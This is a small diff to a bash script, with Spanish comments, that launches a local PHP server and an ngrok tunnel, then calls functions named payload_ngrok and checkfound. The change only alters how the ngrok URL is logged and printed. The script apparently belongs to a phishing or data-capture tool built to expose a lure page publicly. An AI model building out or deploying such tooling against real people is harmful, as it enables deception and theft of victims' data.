@@ -110,7 +110,8 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
 php -S 127.0.0.1:"$puerto_local" > /dev/null 2>&1 &
 sleep 2
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
-./ngrok http "$puerto_local" > /dev/null 2>&1 &
+./ngrok http "$puerto_local" > ngrok.log 2>&1 &
+cat ngrok.log
 sleep 10
 
 # Obtener la URL de Ngrok
@@ -119,8 +120,6 @@ ngrok_url=$(echo "$ngrok_info" | jq -r '.tunnels[0].public_url')
 
 echo "El enlace de Ngrok es: $ngrok_url"
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
 
 payload_ngrok
 checkfound
